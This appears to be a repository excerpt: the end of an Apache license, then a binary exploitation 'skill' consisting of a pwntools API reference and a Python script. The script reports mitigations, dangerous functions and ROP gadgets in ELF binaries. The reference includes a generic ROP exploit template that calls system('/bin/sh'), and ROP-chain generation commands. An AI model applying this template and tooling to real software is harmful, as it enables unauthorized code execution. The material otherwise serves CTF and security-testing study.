   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-binary-exploitation-analysis/references/api-reference.md =====
# API Reference: Binary Exploitation Analysis

## pwntools (Python)
```bash
pip install pwntools
```

### ELF Analysis
```python
from pwn import ELF, ROP, context

elf = ELF('./vulnerable_binary')
print(elf.checksec())         # Security mitigations
print(hex(elf.sym['main']))   # Symbol address
print(hex(elf.plt['system'])) # PLT entry
print(hex(elf.got['puts']))   # GOT entry

# ROP gadget discovery
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
```

### Exploit Template
```python
from pwn import *

context.binary = elf = ELF('./vuln')
p = process('./vuln')  # or remote('host', port)
payload = flat(b'A' * offset, pop_rdi, next(elf.search(b'/bin/sh')), elf.plt['system'])
p.sendline(payload)
p.interactive()
```

## checksec CLI
```bash
checksec --file ./binary
checksec --file ./binary --output json
```

### Output Fields
| Field | Values | Impact |
|-------|--------|--------|
| NX | Enabled/Disabled | No shellcode on stack |
| PIE | Enabled/Disabled | Randomized addresses |
| Canary | Found/Not found | Stack smash detection |
| RELRO | Full/Partial/None | GOT write protection |

## ROPgadget CLI
```bash
# Find all gadgets
ROPgadget --binary ./vuln

# Search specific gadget
ROPgadget --binary ./vuln --only "pop|ret"

# Generate ROP chain
ROPgadget --binary ./vuln --ropchain
```

## Dangerous Functions
| Function | Risk |
|----------|------|
| gets() | Unbounded stdin read |
| strcpy() | No length check |
| sprintf() | No length check |
| scanf() | Possible overflow |

## MITRE ATT&CK
| Technique | Description |
|-----------|------------|
| T1203 | Exploitation for Client Execution |
| T1068 | Exploitation for Privilege Escalation |
| T1211 | Exploitation for Defense Evasion |

===== END FILE =====


===== FILE: skills/performing-binary-exploitation-analysis/scripts/agent.py =====
#!/usr/bin/env python3
"""Binary exploitation analysis agent.

# For authorized security testing and CTF challenges only

Analyzes ELF binaries for security mitigations, discovers ROP gadgets,
and assists exploit development using pwntools and checksec.
"""

import argparse
import json
import subprocess
import sys
import datetime

try:
    from pwn import ELF, ROP
    HAS_PWNTOOLS = True
except ImportError:
    HAS_PWNTOOLS = False


def run_checksec(binary_path):
    """Analyze binary security mitigations using checksec."""
    if HAS_PWNTOOLS:
        try:
            elf = ELF(binary_path, checksec=False)
            return {
                "arch": elf.arch,
                "bits": elf.bits,
                "endian": elf.endian,
                "nx": elf.nx,
                "pie": elf.pie,
                "canary": elf.canary,
                "relro": "Full" if elf.relro == "Full" else ("Partial" if elf.relro else "None"),
                "stripped": not elf.sym,
                "static": elf.statically_linked,
            }
        except Exception as e:
            return {"error": str(e)}
    try:
        result = subprocess.run(["checksec", "--file", binary_path, "--output", "json"],
                                capture_output=True, text=True, timeout=10)
        if result.stdout:
            return json.loads(result.stdout)
    except (FileNotFoundError, subprocess.TimeoutExpired, json.JSONDecodeError):
        pass
    return {"error": "Neither pwntools nor checksec available"}


def find_rop_gadgets(binary_path, max_gadgets=20):
    """Find ROP gadgets using pwntools or ROPgadget."""
    if HAS_PWNTOOLS:
        try:
            elf = ELF(binary_path, checksec=False)
            rop = ROP(elf)
            gadgets = []
            for gadget in rop.gadgets.values():
                if len(gadgets) >= max_gadgets:
                    break
                gadgets.append({
                    "address": hex(gadget.address),
                    "insns": "; ".join(gadget.insns),
                })
            return gadgets
        except Exception as e:
            return [{"error": str(e)}]
    try:
        result = subprocess.run(
            ["ROPgadget", "--binary", binary_path, "--count", str(max_gadgets)],
            capture_output=True, text=True, timeout=30
        )
        gadgets = []
        for line in result.stdout.splitlines():
            if " : " in line:
                parts = line.split(" : ", 1)
                gadgets.append({"address": parts[0].strip(), "insns": parts[1].strip()})
        return gadgets[:max_gadgets]
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return [{"error": "Neither pwntools ROP nor ROPgadget available"}]


def find_useful_functions(binary_path):
    """Find useful functions for exploitation (system, exec, write, etc.)."""
    if not HAS_PWNTOOLS:
        return {"error": "pwntools not available"}
    try:
        elf = ELF(binary_path, checksec=False)
        interesting = ["system", "execve", "exec", "popen", "gets", "strcpy",
                       "sprintf", "read", "write", "puts", "printf", "mprotect"]
        found = {}
        for func in interesting:
            addr = elf.sym.get(func) or elf.plt.get(func)
            if addr:
                found[func] = hex(addr)
        got_entries = {}
        for name in ["system", "printf", "puts", "__libc_start_main"]:
            if name in elf.got:
                got_entries[name] = hex(elf.got[name])
        return {"functions": found, "got_entries": got_entries}
    except Exception as e:
        return {"error": str(e)}


def find_vulnerable_functions(binary_path):
    """Identify potentially vulnerable functions in the binary."""
    dangerous = {"gets": "Unbounded read - guaranteed buffer overflow",
                 "strcpy": "No length check - possible overflow",
                 "strcat": "No length check - possible overflow",
                 "sprintf": "No length check - possible overflow",
                 "scanf": "Possible format string / overflow",
                 "vsprintf": "No length check - possible overflow"}
    if not HAS_PWNTOOLS:
        return {"error": "pwntools not available"}
    try:
        elf = ELF(binary_path, checksec=False)
        found = []
        for func, reason in dangerous.items():
            if func in elf.plt or func in elf.sym:
                found.append({"function": func, "reason": reason,
                              "address": hex(elf.plt.get(func, elf.sym.get(func, 0)))})
        return found
    except Exception as e:
        return [{"error": str(e)}]


def analyze_binary(binary_path):
    """Full binary exploitation analysis."""
    report = {
        "binary": binary_path,
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "checksec": run_checksec(binary_path),
        "dangerous_functions": find_vulnerable_functions(binary_path),
        "useful_functions": find_useful_functions(binary_path),
        "rop_gadgets": find_rop_gadgets(binary_path, max_gadgets=15),
    }
    mitigations = report["checksec"]
    if isinstance(mitigations, dict) and "error" not in mitigations:
        report["exploit_difficulty"] = "HARD" if all([
            mitigations.get("nx"), mitigations.get("pie"),
            mitigations.get("canary"), mitigations.get("relro") == "Full"
        ]) else "MEDIUM" if mitigations.get("nx") else "EASY"
    return report


def main():
    parser = argparse.ArgumentParser(
        description="Binary exploitation analysis agent (authorized testing only)"
    )
    parser.add_argument("binary", nargs="?", help="Path to ELF binary")
    parser.add_argument("--checksec-only", action="store_true", help="Only run checksec")
    parser.add_argument("--gadgets", type=int, default=15, help="Max ROP gadgets to find")
    parser.add_argument("--output", "-o", help="Output JSON report path")
    args = parser.parse_args()

    print("[*] Binary Exploitation Analysis Agent")
    print("[*] For authorized security testing and CTF challenges only")
    print(f"    pwntools available: {HAS_PWNTOOLS}")

    if not args.binary:
        print("\nUsage: python agent.py /path/to/binary [--checksec-only] [--gadgets 20]")
        print("  Analyzes: mitigations, dangerous functions, ROP gadgets, GOT entries")
        print(json.dumps({"demo": True, "pwntools": HAS_PWNTOOLS}, indent=2))
        sys.exit(0)

    if args.checksec_only:
        result = run_checksec(args.binary)
        print(json.dumps(result, indent=2))
        sys.exit(0)

    report = analyze_binary(args.binary)
    checksec = report.get("checksec", {})
    if isinstance(checksec, dict) and "error" not in checksec:
        print(f"\n[*] Architecture: {checksec.get('arch')} ({checksec.get('bits')}-bit)")
        print(f"    NX: {checksec.get('nx')} | PIE: {checksec.get('pie')} | "
              f"Canary: {checksec.get('canary')} | RELRO: {checksec.get('relro')}")
        print(f"    Exploit difficulty: {report.get('exploit_difficulty', '?')}")

    dangerous = report.get("dangerous_functions", [])
    if isinstance(dangerous, list) and dangerous:
        print(f"\n[!] Dangerous functions found: {len(dangerous)}")
        for d in dangerous:
            if "error" not in d:
                print(f"    {d['function']} @ {d['address']}: {d['reason']}")

    gadgets = report.get("rop_gadgets", [])
    if gadgets and "error" not in gadgets[0]:
        print(f"\n[*] ROP gadgets found: {len(gadgets)}")
        for g in gadgets[:5]:
            print(f"    {g['address']}: {g['insns']}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)
    print(json.dumps({"difficulty": report.get("exploit_difficulty", "unknown"),
                       "gadgets": len(gadgets)}, indent=2))


if __name__ == "__main__":
    main()

===== END FILE =====
